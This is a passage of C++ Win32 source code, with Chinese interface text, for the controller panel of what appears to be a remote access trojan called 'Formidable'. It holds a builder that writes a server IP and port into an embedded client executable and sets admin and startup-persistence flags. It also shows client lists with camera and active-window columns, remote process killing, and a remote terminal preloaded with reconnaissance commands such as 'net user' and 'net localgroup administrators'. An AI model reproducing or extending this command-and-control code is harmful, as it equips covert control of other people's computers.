        g_hStatusBar = CreateStatusWindowW(WS_CHILD | WS_VISIBLE, L"", hWnd, IDC_STATUSBAR);
        g_hListClients = CreateWindowExW(WS_EX_CLIENTEDGE, WC_LISTVIEWW, L"", 
            WS_CHILD | WS_VISIBLE | LVS_REPORT | LVS_SHOWSELALWAYS, 
            0, 0, 0, 0, hWnd, (HMENU)IDC_LIST_CLIENTS, g_hInstance, NULL);
        ListView_SetExtendedListViewStyle(g_hListClients, LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES | LVS_EX_DOUBLEBUFFER);
        InitListView(g_hListClients);
        
        g_hListLogs = CreateWindowExW(WS_EX_CLIENTEDGE, WC_LISTVIEWW, L"", 
            WS_CHILD | WS_VISIBLE | LVS_REPORT, 
            0, 0, 0, 0, hWnd, (HMENU)IDC_LIST_LOGS, g_hInstance, NULL);
        ListView_SetExtendedListViewStyle(g_hListLogs, LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES | LVS_EX_DOUBLEBUFFER);
        
        LVCOLUMNW lvc = { 0 };
        lvc.mask = LVCF_TEXT | LVCF_WIDTH;
        lvc.pszText = (LPWSTR)L"信息类型"; lvc.cx = 100; ListView_InsertColumn(g_hListLogs, 0, &lvc);
        lvc.pszText = (LPWSTR)L"时间";     lvc.cx = 100; ListView_InsertColumn(g_hListLogs, 1, &lvc);
        lvc.pszText = (LPWSTR)L"信息内容"; lvc.cx = 800; ListView_InsertColumn(g_hListLogs, 2, &lvc);

        // 设置全局字体
        NONCLIENTMETRICSW ncm = { sizeof(NONCLIENTMETRICSW) };
        if (SystemParametersInfoW(SPI_GETNONCLIENTMETRICS, sizeof(ncm), &ncm, 0)) {
            HFONT hFont = CreateFontIndirectW(&ncm.lfMessageFont);
            SendMessage(g_hListClients, WM_SETFONT, (WPARAM)hFont, TRUE);
            SendMessage(g_hListLogs, WM_SETFONT, (WPARAM)hFont, TRUE);
            SendMessage(g_hStatusBar, WM_SETFONT, (WPARAM)hFont, TRUE);
        }
        break;
    }
    case WM_SIZE: {
        int width = LOWORD(lParam);
        int height = HIWORD(lParam);
        
        // 重新计算布局
        RECT rcToolbar, rcStatus;
        SendMessage(g_hToolbar, TB_AUTOSIZE, 0, 0);
        GetWindowRect(g_hToolbar, &rcToolbar);
        GetWindowRect(g_hStatusBar, &rcStatus);
        
        int toolbarHeight = rcToolbar.bottom - rcToolbar.top;
        int statusHeight = rcStatus.bottom - rcStatus.top;
        int logHeight = 150;
        int remainHeight = height - toolbarHeight - statusHeight;
        
        MoveWindow(g_hToolbar, 0, 0, width, toolbarHeight, TRUE);
        MoveWindow(g_hListClients, 0, toolbarHeight, width, remainHeight - logHeight, TRUE);
        MoveWindow(g_hListLogs, 0, height - statusHeight - logHeight, width, logHeight, TRUE);
        SendMessage(g_hStatusBar, WM_SIZE, 0, 0);
        break;
    }
    case WM_COMMAND: {
        HandleCommand(hWnd, LOWORD(wParam));
        break;
    }
    case WM_TRAYICON: {
        if (lParam == WM_LBUTTONDBLCLK) {
            ShowWindow(hWnd, SW_RESTORE);
            SetForegroundWindow(hWnd);
        } else if (lParam == WM_RBUTTONUP) {
            POINT pt;
            GetCursorPos(&pt);
            HMENU hMenu = CreatePopupMenu();
            AppendMenuW(hMenu, MF_STRING, IDM_TRAY_STARTUP, L"设为开机启动");
            AppendMenuW(hMenu, MF_STRING, IDM_TRAY_RESTART, L"重启主控程序");
            AppendMenuW(hMenu, MF_SEPARATOR, 0, NULL);
            AppendMenuW(hMenu, MF_STRING, IDM_TRAY_EXIT, L"退出");
            SetForegroundWindow(hWnd);
            TrackPopupMenu(hMenu, TPM_RIGHTBUTTON | TPM_BOTTOMALIGN, pt.x, pt.y, 0, hWnd, NULL);
            DestroyMenu(hMenu);
        }
        break;
    }
    case WM_LOC_UPDATE: {
        struct UpdateData { uint32_t id; std::wstring loc; int index; };
        UpdateData* data = (UpdateData*)lParam;
        if (data) {
            ListView_SetItemText(g_hListClients, data->index, 3, (LPWSTR)data->loc.c_str());
            delete data;
        }
        break;
    }
    case WM_DESTROY:
        if (g_hTermFont) DeleteObject(g_hTermFont);
        if (g_hTermEditBkBrush) DeleteObject(g_hTermEditBkBrush);
        RemoveTrayIcon(hWnd);
        PostQuitMessage(0);
        break;
    default:
        return DefWindowProcW(hWnd, message, wParam, lParam);
    }
    return 0;
}
void InitListView(HWND hList) {
    const wchar_t* columns[] = { L"IP", L"端口", L"LAN地址", L"地理位置", L"计算机名/备注", L"操作系统", L"CPU", L"摄像头", L"RTT", L"版本", L"安装时间", L"系统运行时间", L"活动窗口", L"类型" };
    int widths[] = { 120, 60, 120, 100, 150, 120, 180, 60, 60, 80, 150, 150, 180, 80 };
    LVCOLUMNW lvc = { 0 };
    lvc.mask = LVCF_TEXT | LVCF_WIDTH;
    for (int i = 0; i < 14; i++) {
        lvc.pszText = (LPWSTR)columns[i];
        lvc.cx = widths[i];
        ListView_InsertColumn(hList, i, &lvc);
    }
}
void AddLog(const std::wstring& type, const std::wstring& msg) {
    LVITEMW lvi = { 0 };
    lvi.mask = LVIF_TEXT;
    lvi.pszText = (LPWSTR)type.c_str();
    int index = ListView_InsertItem(g_hListLogs, &lvi);
    time_t now = time(0);
    struct tm tstruct;
    localtime_s(&tstruct, &now);
    wchar_t timeStr[32];
    wcsftime(timeStr, sizeof(timeStr) / sizeof(wchar_t), L"%H:%M:%S", &tstruct);
    ListView_SetItemText(g_hListLogs, index, 1, (LPWSTR)timeStr);
    ListView_SetItemText(g_hListLogs, index, 2, (LPWSTR)msg.c_str());
    ListView_EnsureVisible(g_hListLogs, index, FALSE);
}
// --- 生成服务端逻辑 ---
INT_PTR CALLBACK BuilderDlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam) {
    switch (message) {
    case WM_INITDIALOG:
        SetDlgItemTextW(hDlg, IDC_EDIT_IP, L"127.0.0.1");
        SetDlgItemTextW(hDlg, IDC_EDIT_PORT, ToWString(DEFAULT_PORT).c_str());
        SetDlgItemTextW(hDlg, IDC_EDIT_GROUP, L"Default");
        CheckDlgButton(hDlg, IDC_CHECK_ADMIN, BST_CHECKED);
        CheckDlgButton(hDlg, IDC_CHECK_STARTUP, BST_CHECKED);
        CheckRadioButton(hDlg, IDC_RADIO_X86, IDC_RADIO_X64, IDC_RADIO_X64); // 默认选择 x64
        return (INT_PTR)TRUE;
    case WM_COMMAND:
        if (LOWORD(wParam) == IDC_CHECK_BOTH) {
            BOOL isBoth = IsDlgButtonChecked(hDlg, IDC_CHECK_BOTH);
            EnableWindow(GetDlgItem(hDlg, IDC_RADIO_X86), !isBoth);
            EnableWindow(GetDlgItem(hDlg, IDC_RADIO_X64), !isBoth);
            return (INT_PTR)TRUE;
        }
        if (LOWORD(wParam) == IDCANCEL) {
            EndDialog(hDlg, LOWORD(wParam));
            return (INT_PTR)TRUE;
        }
        if (LOWORD(wParam) == IDC_BTN_BUILD) {
            wchar_t wIP[100], wPort[8], wGroup[24];
            GetDlgItemTextW(hDlg, IDC_EDIT_IP, wIP, 100);
            GetDlgItemTextW(hDlg, IDC_EDIT_PORT, wPort, 8);
            GetDlgItemTextW(hDlg, IDC_EDIT_GROUP, wGroup, 24);

            if (wcslen(wIP) == 0 || wcslen(wPort) == 0) {
                MessageBoxW(hDlg, L"IP和端口不能为空！", L"提示", MB_OK | MB_ICONWARNING);
                return (INT_PTR)TRUE;
            }

            std::string ip = WideToUTF8(wIP);
            std::string port = WideToUTF8(wPort);
            std::string group = WideToUTF8(wGroup);
            bool runAsAdmin = (IsDlgButtonChecked(hDlg, IDC_CHECK_ADMIN) == BST_CHECKED);
            bool startup = (IsDlgButtonChecked(hDlg, IDC_CHECK_STARTUP) == BST_CHECKED);
            bool buildBoth = (IsDlgButtonChecked(hDlg, IDC_CHECK_BOTH) == BST_CHECKED);
            bool is64Bit = (IsDlgButtonChecked(hDlg, IDC_RADIO_X64) == BST_CHECKED);

            // 选择保存路径
            wchar_t szSavePath[MAX_PATH] = L"Formidable_Client.exe";
            OPENFILENAMEW ofn = { 0 };
            ofn.lStructSize = sizeof(ofn);
            ofn.hwndOwner = hDlg;
            ofn.lpstrFilter = L"可执行文件 (*.exe)\0*.exe\0所有文件 (*.*)\0*.*\0";
            ofn.lpstrFile = szSavePath;
            ofn.nMaxFile = MAX_PATH;
            ofn.Flags = OFN_OVERWRITEPROMPT | OFN_PATHMUSTEXIST;
            ofn.lpstrDefExt = L"exe";
            ofn.lpstrTitle = L"选择保存位置";

            if (!GetSaveFileNameW(&ofn)) return (INT_PTR)TRUE;

            std::wstring baseSavePath = szSavePath;
            // 如果是 Both，我们需要在文件名中加入架构标识
            
            // 获取当前程序路径
            wchar_t szMasterPath[MAX_PATH];
            GetModuleFileNameW(NULL, szMasterPath, MAX_PATH);
            std::wstring masterDir = szMasterPath;
            size_t pos = masterDir.find_last_of(L"\\/");
            masterDir = masterDir.substr(0, pos + 1);

            auto BuildOne = [&](bool x64, const std::wstring& dest) -> bool {
                std::vector<char> buffer;
                int resId = x64 ? IDR_CLIENT_EXE_X64 : IDR_CLIENT_EXE_X86;
                if (!GetResourceData(resId, buffer)) return false;

                bool found = false;
                DWORD dwSize = (DWORD)buffer.size();
                for (size_t i = 0; i < dwSize - sizeof(CONNECT_ADDRESS); i++) {
                    if (memcmp(buffer.data() + i, "FRMD26_CONFIG", 13) == 0) {
                        CONNECT_ADDRESS* pAddr = (CONNECT_ADDRESS*)(buffer.data() + i);
                        memset(pAddr->szServerIP, 0, sizeof(pAddr->szServerIP));
                        memset(pAddr->szPort, 0, sizeof(pAddr->szPort));
                        memset(pAddr->szGroupName, 0, sizeof(pAddr->szGroupName));
                        
                        strncpy_s(pAddr->szServerIP, ip.c_str(), _TRUNCATE);
                        strncpy_s(pAddr->szPort, port.c_str(), _TRUNCATE);
                        strncpy_s(pAddr->szGroupName, group.c_str(), _TRUNCATE);
                        pAddr->runasAdmin = runAsAdmin ? 1 : 0;
                        pAddr->iStartup = startup ? 1 : 0;
                        found = true;
                        break;
                    }
                }
                if (!found) return false;

                HANDLE hFile = CreateFileW(dest.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
                if (hFile == INVALID_HANDLE_VALUE) return false;
                DWORD written;
                WriteFile(hFile, buffer.data(), dwSize, &written, NULL);
                CloseHandle(hFile);
                return true;
            };

            bool success = true;
            std::wstring successMsg = L"服务端生成成功！\n";
            if (buildBoth) {
                std::wstring pathX64 = baseSavePath;
                size_t dotPos = pathX64.find_last_of(L'.');
                if (dotPos != std::wstring::npos) {
                    pathX64.insert(dotPos, L"_x64");
                } else {
                    pathX64 += L"_x64.exe";
                }
                
                std::wstring pathX86 = baseSavePath;
                dotPos = pathX86.find_last_of(L'.');
                if (dotPos != std::wstring::npos) {
                    pathX86.insert(dotPos, L"_x86");
                } else {
                    pathX86 += L"_x86.exe";
                }

                if (BuildOne(true, pathX64) && BuildOne(false, pathX86)) {
                    successMsg += L"已生成 x64 和 x86 两个版本的程序。";
                } else {
                    success = false;
                }
            } else {
                if (BuildOne(is64Bit, baseSavePath)) {
                    successMsg += L"文件已保存。";
                } else {
                    success = false;
                }
            }

            if (success) {
                MessageBoxW(hDlg, successMsg.c_str(), L"成功", MB_OK | MB_ICONINFORMATION);
            } else {
                MessageBoxW(hDlg, L"生成失败，请检查资源文件或写入权限。", L"错误", MB_OK | MB_ICONERROR);
            }

            EndDialog(hDlg, LOWORD(wParam));
            return (INT_PTR)TRUE;
        }
        break;
    }
    return (INT_PTR)FALSE;
}
INT_PTR CALLBACK ProcessDlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam) {
    static std::map<HWND, uint32_t> dlgToClientId;
    
    switch (message) {
    case WM_INITDIALOG: {
        uint32_t clientId = (uint32_t)lParam;
        dlgToClientId[hDlg] = clientId;
        
        HWND hList = GetDlgItem(hDlg, IDC_LIST_PROCESS);
        ListView_SetExtendedListViewStyle(hList, LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES);
        
        LVCOLUMNW lvc = { 0 };
        lvc.mask = LVCF_TEXT | LVCF_WIDTH;
        lvc.pszText = (LPWSTR)L"进程名称"; lvc.cx = 200; ListView_InsertColumn(hList, 0, &lvc);
        lvc.pszText = (LPWSTR)L"PID";      lvc.cx = 80;  ListView_InsertColumn(hList, 1, &lvc);
        lvc.pszText = (LPWSTR)L"线程数";   lvc.cx = 60;  ListView_InsertColumn(hList, 2, &lvc);
        lvc.pszText = (LPWSTR)L"优先级";   lvc.cx = 60;  ListView_InsertColumn(hList, 3, &lvc);
        lvc.pszText = (LPWSTR)L"架构";     lvc.cx = 60;  ListView_InsertColumn(hList, 4, &lvc);
        lvc.pszText = (LPWSTR)L"所有者";   lvc.cx = 120; ListView_InsertColumn(hList, 5, &lvc);
        lvc.pszText = (LPWSTR)L"文件路径"; lvc.cx = 300; ListView_InsertColumn(hList, 6, &lvc);
        
        // 初始自动刷新
        SendMessage(hDlg, WM_COMMAND, IDM_PROCESS_REFRESH, 0);
        return (INT_PTR)TRUE;
    }
    case WM_SIZE: {
        RECT rc;
        GetClientRect(hDlg, &rc);
        MoveWindow(GetDlgItem(hDlg, IDC_LIST_PROCESS), 0, 0, rc.right, rc.bottom, TRUE);
        return (INT_PTR)TRUE;
    }
    case WM_NOTIFY: {
        LPNMHDR nm = (LPNMHDR)lParam;
        if (nm->idFrom == IDC_LIST_PROCESS && nm->code == NM_RCLICK) {
            LPNMLISTVIEW pnmv = (LPNMLISTVIEW)lParam;
            POINT pt;
            GetCursorPos(&pt);
            HMENU hMenu = CreatePopupMenu();
            AppendMenuW(hMenu, MF_STRING, IDM_PROCESS_REFRESH, L"刷新列表");
            AppendMenuW(hMenu, MF_SEPARATOR, 0, NULL);
            AppendMenuW(hMenu, MF_STRING, IDM_PROCESS_MODULES, L"查看模块列表");
            AppendMenuW(hMenu, MF_STRING, IDM_PROCESS_KILL, L"结束进程");
            AppendMenuW(hMenu, MF_SEPARATOR, 0, NULL);
            AppendMenuW(hMenu, MF_STRING, IDM_PROCESS_COPY_PATH, L"复制文件路径");
            AppendMenuW(hMenu, MF_STRING, IDM_PROCESS_OPEN_DIR, L"打开文件目录");
            
            TrackPopupMenu(hMenu, TPM_RIGHTBUTTON, pt.x, pt.y, 0, hDlg, NULL);
            DestroyMenu(hMenu);
        }
        break;
    }
    case WM_COMMAND: {
        uint32_t clientId = dlgToClientId[hDlg];
        std::shared_ptr<ConnectedClient> client;
        {
            std::lock_guard<std::mutex> lock(g_ClientsMutex);
            if (g_Clients.count(clientId)) client = g_Clients[clientId];
        }
        if (!client) break;

        int wmId = LOWORD(wParam);
        if (wmId == IDC_BTN_REFRESH || wmId == IDM_PROCESS_REFRESH) {
            AddLog(L"系统", L"正在刷新进程列表...");
            SendModuleToClient(clientId, CMD_LOAD_MODULE, L"ProcessManager.dll", CMD_PROCESS_LIST);
        } else if (wmId == IDC_BTN_KILL || wmId == IDM_PROCESS_KILL) {
            HWND hList = GetDlgItem(hDlg, IDC_LIST_PROCESS);
            int index = ListView_GetNextItem(hList, -1, LVNI_SELECTED);
            if (index != -1) {
                LVITEMW lvi = { 0 };
                lvi.mask = LVIF_PARAM;
                lvi.iItem = index;
                if (ListView_GetItem(hList, &lvi)) {
                    uint32_t pid = (uint32_t)lvi.lParam;
                    if (MessageBoxW(hDlg, L"确定要结束该进程吗？", L"提示", MB_YESNO | MB_ICONQUESTION) == IDYES) {
                        AddLog(L"系统", L"正在结束进程 PID: " + ToWString((int)pid));
                        SendModuleToClient(clientId, CMD_PROCESS_KILL, L"ProcessManager.dll", pid);
                    }
                }
            }
        } else if (wmId == IDM_PROCESS_MODULES) {
            HWND hList = GetDlgItem(hDlg, IDC_LIST_PROCESS);
            int index = ListView_GetNextItem(hList, -1, LVNI_SELECTED);
            if (index != -1) {
                LVITEMW lvi = { 0 };
                lvi.mask = LVIF_PARAM;
                lvi.iItem = index;
                if (ListView_GetItem(hList, &lvi)) {
                    uint32_t pid = (uint32_t)lvi.lParam;
                    struct ModParam { uint32_t cid; uint32_t pid; } param = { clientId, pid };
                    DialogBoxParamW(g_hInstance, MAKEINTRESOURCEW(IDD_MODULES), hDlg, ModuleDlgProc, (LPARAM)&param);
                }
            }
        } else if (wmId == IDM_PROCESS_COPY_PATH) {
            HWND hList = GetDlgItem(hDlg, IDC_LIST_PROCESS);
            int index = ListView_GetNextItem(hList, -1, LVNI_SELECTED);
            if (index != -1) {
                wchar_t szPath[MAX_PATH];
                ListView_GetItemText(hList, index, 6, szPath, MAX_PATH);
                if (wcslen(szPath) > 0) {
                    if (OpenClipboard(hDlg)) {
                        EmptyClipboard();
                        size_t size = (wcslen(szPath) + 1) * sizeof(wchar_t);
                        HGLOBAL hGlobal = GlobalAlloc(GMEM_MOVEABLE, size);
                        if (hGlobal) {
                            void* p = GlobalLock(hGlobal);
                            memcpy(p, szPath, size);
                            GlobalUnlock(hGlobal);
                            SetClipboardData(CF_UNICODETEXT, hGlobal);
                        }
                        CloseClipboard();
                        AddLog(L"提示", L"路径已复制到剪贴板");
                    }
                }
            }
        } else if (wmId == IDM_PROCESS_OPEN_DIR) {
            HWND hList = GetDlgItem(hDlg, IDC_LIST_PROCESS);
            int index = ListView_GetNextItem(hList, -1, LVNI_SELECTED);
            if (index != -1) {
                wchar_t szPath[MAX_PATH];
                ListView_GetItemText(hList, index, 6, szPath, MAX_PATH);
                if (wcslen(szPath) > 0) {
                    // 由于是远程路径，无法在本地直接打开。
                    // 但如果是为了以后实现文件管理功能做铺垫，这里可以先记个日志或者弹出提示
                    AddLog(L"提示", L"远程文件路径: " + std::wstring(szPath));
                    MessageBoxW(hDlg, (L"该功能需要文件管理模块支持，目前仅显示路径：\n\n" + std::wstring(szPath)).c_str(), L"提示", MB_OK | MB_ICONINFORMATION);
                }
            }
        } else if (wmId == IDCANCEL) {
            SendMessage(hDlg, WM_CLOSE, 0, 0);
            return (INT_PTR)TRUE;
        }
        break;
    }
    case WM_CLOSE: {
        uint32_t clientId = dlgToClientId[hDlg];
        std::shared_ptr<ConnectedClient> client;
        {
            std::lock_guard<std::mutex> lock(g_ClientsMutex);
            if (g_Clients.count(clientId)) client = g_Clients[clientId];
        }
        if (client) {
            client->hProcessDlg = NULL;
        }
        EndDialog(hDlg, 0);
        dlgToClientId.erase(hDlg);
        return (INT_PTR)TRUE;
    }
    }
    return (INT_PTR)FALSE;
}

// 进程模块列表对话框过程
INT_PTR CALLBACK ModuleDlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam) {
    struct ModParam { uint32_t cid; uint32_t pid; };
    static std::map<HWND, ModParam> dlgParams;

    switch (message) {
    case WM_INITDIALOG: {
        ModParam* p = (ModParam*)lParam;
        dlgParams[hDlg] = *p;

        std::shared_ptr<ConnectedClient> client;
        {
            std::lock_guard<std::mutex> lock(g_ClientsMutex);
            if (g_Clients.count(p->cid)) client = g_Clients[p->cid];
        }
        if (client) client->hModuleDlg = hDlg;

        HWND hList = GetDlgItem(hDlg, IDC_LIST_MODULES);
        ListView_SetExtendedListViewStyle(hList, LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES);

        LVCOLUMNW lvc = { 0 };
        lvc.mask = LVCF_TEXT | LVCF_WIDTH;
        lvc.pszText = (LPWSTR)L"模块名称"; lvc.cx = 150; ListView_InsertColumn(hList, 0, &lvc);
        lvc.pszText = (LPWSTR)L"基地址";   lvc.cx = 120; ListView_InsertColumn(hList, 1, &lvc);
        lvc.pszText = (LPWSTR)L"大小";     lvc.cx = 80;  ListView_InsertColumn(hList, 2, &lvc);
        lvc.pszText = (LPWSTR)L"路径";     lvc.cx = 300; ListView_InsertColumn(hList, 3, &lvc);

        // 发送获取模块列表请求
        AddLog(L"系统", L"正在获取进程模块列表 PID: " + ToWString((int)p->pid));
        SendModuleToClient(p->cid, CMD_PROCESS_MODULES, L"ProcessManager.dll", p->pid);

        return (INT_PTR)TRUE;
    }
    case WM_SIZE: {
        RECT rc;
        GetClientRect(hDlg, &rc);
        MoveWindow(GetDlgItem(hDlg, IDC_LIST_MODULES), 0, 0, rc.right, rc.bottom, TRUE);
        return (INT_PTR)TRUE;
    }
    case WM_COMMAND: {
        if (LOWORD(wParam) == IDCANCEL) {
            SendMessage(hDlg, WM_CLOSE, 0, 0);
            return (INT_PTR)TRUE;
        }
        break;
    }
    case WM_CLOSE: {
        ModParam p = dlgParams[hDlg];
        std::shared_ptr<ConnectedClient> client;
        {
            std::lock_guard<std::mutex> lock(g_ClientsMutex);
            if (g_Clients.count(p.cid)) client = g_Clients[p.cid];
        }
        if (client) client->hModuleDlg = NULL;

        EndDialog(hDlg, 0);
        dlgParams.erase(hDlg);
        return (INT_PTR)TRUE;
    }
    }
    return (INT_PTR)FALSE;
}

// 终端输出框子类化过程，用于实现直接输入功能
LRESULT CALLBACK TerminalOutEditProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam, UINT_PTR uIdSubclass, DWORD_PTR dwRefData) {
    HWND hDlg = (HWND)dwRefData;
    HWND hEditIn = GetDlgItem(hDlg, IDC_EDIT_TERM_IN);

    switch (message) {
    case WM_SETFOCUS:
        // 当输出框获得焦点时，隐藏光标或将其移到末尾 (可选)
        break;
    case WM_CHAR: {
        // 直接将输入的字符发送到被控端
        if (wParam == VK_RETURN) {
            SendMessage(hDlg, WM_COMMAND, MAKEWPARAM(IDC_BTN_TERM_SEND, BN_CLICKED), (LPARAM)GetDlgItem(hDlg, IDC_BTN_TERM_SEND));
            return 0;
        } else if (wParam == VK_BACK) {
            // 处理退格 (简单处理：转发给输入框)
            SendMessage(hEditIn, WM_CHAR, wParam, lParam);
            return 0;
        }
        
        // 其他可见字符
        wchar_t szChar[2] = { (wchar_t)wParam, 0 };
        SendMessage(hEditIn, EM_SETSEL, -1, -1);
        SendMessage(hEditIn, EM_REPLACESEL, FALSE, (LPARAM)szChar);
        return 0;
    }
    case WM_KEYDOWN:
        if (wParam == VK_UP || wParam == VK_DOWN || wParam == VK_LEFT || wParam == VK_RIGHT) {
            // 转发方向键给输入框 (用于历史记录或光标移动)
            SendMessage(hEditIn, WM_KEYDOWN, wParam, lParam);
            return 0;
        }
        break;
    }
    return DefSubclassProc(hWnd, message, wParam, lParam);
}

INT_PTR CALLBACK TerminalDlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam) {
    static std::map<HWND, uint32_t> dlgToClientId;
    switch (message) {
    case WM_INITDIALOG: {
        uint32_t clientId = (uint32_t)lParam;
        dlgToClientId[hDlg] = clientId;

        // 创建并设置终端字体 (Consolas)
        if (g_hTermFont == NULL) {
            g_hTermFont = CreateFontW(16, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
                DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
                CLEARTYPE_QUALITY, FIXED_PITCH | FF_MODERN, L"Consolas");
            if (!g_hTermFont) {
                g_hTermFont = (HFONT)GetStockObject(ANSI_FIXED_FONT);
            }
        }
        
        if (g_hTermEditBkBrush == NULL) {
            g_hTermEditBkBrush = CreateSolidBrush(RGB(0, 0, 0)); // 黑色背景
        }

        SendDlgItemMessage(hDlg, IDC_EDIT_TERM_OUT, WM_SETFONT, (WPARAM)g_hTermFont, TRUE);
        SendDlgItemMessage(hDlg, IDC_EDIT_TERM_IN, WM_SETFONT, (WPARAM)g_hTermFont, TRUE);
        
        // 设置输出框最大长度 (无限制)
        SendDlgItemMessage(hDlg, IDC_EDIT_TERM_OUT, EM_SETLIMITTEXT, 0, 0);
        
        // 子类化输出框以支持直接输入
        SetWindowSubclass(GetDlgItem(hDlg, IDC_EDIT_TERM_OUT), TerminalOutEditProc, 0, (DWORD_PTR)hDlg);

        // 初始化常用命令列表
        HWND hList = GetDlgItem(hDlg, IDC_LIST_COMMON_CMDS);
        ListView_SetExtendedListViewStyle(hList, LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES);
        
        LVCOLUMNW lvc = { 0 };
        lvc.mask = LVCF_TEXT | LVCF_WIDTH;
        lvc.pszText = (LPWSTR)L"命令"; lvc.cx = 150; ListView_InsertColumn(hList, 0, &lvc);
        lvc.pszText = (LPWSTR)L"说明"; lvc.cx = 200; ListView_InsertColumn(hList, 1, &lvc);
        lvc.pszText = (LPWSTR)L"操作"; lvc.cx = 80;  ListView_InsertColumn(hList, 2, &lvc);

        // 添加一些常用命令
        auto AddCmd = [&](const wchar_t* cmd, const wchar_t* desc) {
            LVITEMW lvi = { 0 };
            lvi.mask = LVIF_TEXT;
            lvi.pszText = (LPWSTR)cmd;
            int index = ListView_InsertItem(hList, &lvi);
            ListView_SetItemText(hList, index, 1, (LPWSTR)desc);
            ListView_SetItemText(hList, index, 2, (LPWSTR)L"双击发送");
        };

        AddCmd(L"ipconfig /all", L"查看详细网络配置");
        AddCmd(L"netstat -ano", L"查看网络连接和进程ID");
        AddCmd(L"tasklist", L"列出当前运行的进程");
        AddCmd(L"whoami", L"查看当前用户信息");
        AddCmd(L"systeminfo", L"获取系统详细信息");
        AddCmd(L"net user", L"列出系统用户");
        AddCmd(L"net localgroup administrators", L"查看管理员组成员");
        AddCmd(L"sc query", L"列出所有服务状态");
        AddCmd(L"arp -a", L"查看ARP缓存表");
        AddCmd(L"route print", L"查看路由表");

        // 设置对话框标题 (IP & LAN)
        std::shared_ptr<ConnectedClient> client;
        {
            std::lock_guard<std::mutex> lock(g_ClientsMutex);
            if (g_Clients.count(clientId)) client = g_Clients[clientId];
        }
        if (client) {
            wchar_t szTitle[256];
            char szIP[64];
            inet_ntop(AF_INET, &client->addr.sin_addr, szIP, sizeof(szIP));
            swprintf_s(szTitle, L"远程终端 - [%S] (LAN: %S)", szIP, client->info.lanAddr);
            SetWindowTextW(hDlg, szTitle);
        }

        // 设置输入焦点
        SetFocus(GetDlgItem(hDlg, IDC_EDIT_TERM_IN));
        return (INT_PTR)FALSE;
    }
    case WM_SIZE: {
        RECT rc;
        GetClientRect(hDlg, &rc);
        int width = rc.right - rc.left;
        int height = rc.bottom - rc.top;

        // 动态调整各控件位置和大小
        // 终端输出框 (占上方部分) - 调整占比，为下方留出更多空间
        int outputHeight = height - 260; 
        MoveWindow(GetDlgItem(hDlg, IDC_EDIT_TERM_OUT), 5, 5, width - 10, outputHeight, TRUE);
        
        // 输入框和发送按钮
        int inY = outputHeight + 10;
        MoveWindow(GetDlgItem(hDlg, IDC_EDIT_TERM_IN), 5, inY, width - 70, 22, TRUE);
        MoveWindow(GetDlgItem(hDlg, IDC_BTN_TERM_SEND), width - 60, inY, 55, 22, TRUE);
        
        // 常用命令列表 (占下方较大占比)
        int listY = inY + 30;
        int listHeight = height - listY - 5;
        MoveWindow(GetDlgItem(hDlg, IDC_LIST_COMMON_CMDS), 5, listY, width - 10, listHeight, TRUE);
        
        return (INT_PTR)TRUE;
    }
    case WM_CTLCOLOREDIT:
    case WM_CTLCOLORSTATIC: {
        // 设置终端输出框为黑底绿字
        if ((HWND)lParam == GetDlgItem(hDlg, IDC_EDIT_TERM_OUT) || 
            (HWND)lParam == GetDlgItem(hDlg, IDC_EDIT_TERM_IN)) {
            HDC hdc = (HDC)wParam;
            SetTextColor(hdc, RGB(0, 255, 0)); // 绿色文字
            SetBkColor(hdc, RGB(0, 0, 0));    // 黑色背景
            return (INT_PTR)g_hTermEditBkBrush;
        }
        break;
    }
    case WM_NOTIFY: {
        LPNMHDR nm = (LPNMHDR)lParam;
        if (nm->idFrom == IDC_LIST_COMMON_CMDS) {
            if (nm->code == NM_DBLCLK) {
                LPNMLISTVIEW pnmv = (LPNMLISTVIEW)lParam;
                if (pnmv->iItem != -1) {
                    wchar_t wCmd[512];
                    ListView_GetItemText(nm->hwndFrom, pnmv->iItem, 0, wCmd, 512);
                    SetDlgItemTextW(hDlg, IDC_EDIT_TERM_IN, wCmd);
                    SendMessage(hDlg, WM_COMMAND, MAKEWPARAM(IDC_BTN_TERM_SEND, BN_CLICKED), (LPARAM)GetDlgItem(hDlg, IDC_BTN_TERM_SEND));
                }
            }
        }
        break;
    }
    case WM_COMMAND: {
        uint32_t clientId = dlgToClientId[hDlg];
        std::shared_ptr<ConnectedClient> client;
        {
            std::lock_guard<std::mutex> lock(g_ClientsMutex);
            if (g_Clients.count(clientId)) client = g_Clients[clientId];
        }
        if (!client) break;

        if (LOWORD(wParam) == IDC_BTN_TERM_SEND || (LOWORD(wParam) == IDOK)) {
            wchar_t wCmd[512];
            GetDlgItemTextW(hDlg, IDC_EDIT_TERM_IN, wCmd, 512);
            
            std::wstring cmdW = wCmd;
            if (!cmdW.empty()) {
                // 确保命令以换行符结尾
                if (cmdW.back() != L'\n' && cmdW.back() != L'\r') {
                    cmdW += L"\r\n";
                }
                
                std::string cmd = WideToUTF8(cmdW);
                SetDlgItemTextW(hDlg, IDC_EDIT_TERM_IN, L"");
                
                // 本地回显命令
                std::wstring echo = L"> " + cmdW;
                HWND hEditOut = GetDlgItem(hDlg, IDC_EDIT_TERM_OUT);
                int len = GetWindowTextLengthW(hEditOut);
                
                // 限制缓冲区大小 (增加到 500,000 字符)
                if (len > 500000) {
                    SendMessageW(hEditOut, EM_SETSEL, 0, 250000);
                    SendMessageW(hEditOut, EM_REPLACESEL, 0, (LPARAM)L"... [已截断] ...\r\n");
                    len = GetWindowTextLengthW(hEditOut);
                }
                
                SendMessageW(hEditOut, EM_SETSEL, len, len);
                SendMessageW(hEditOut, EM_REPLACESEL, 0, (LPARAM)echo.c_str());
                SendMessageW(hEditOut, EM_SCROLLCARET, 0, 0); // 滚动到底部
                
                CommandPkg pkg = { 0 };
                pkg.cmd = CMD_TERMINAL_DATA;
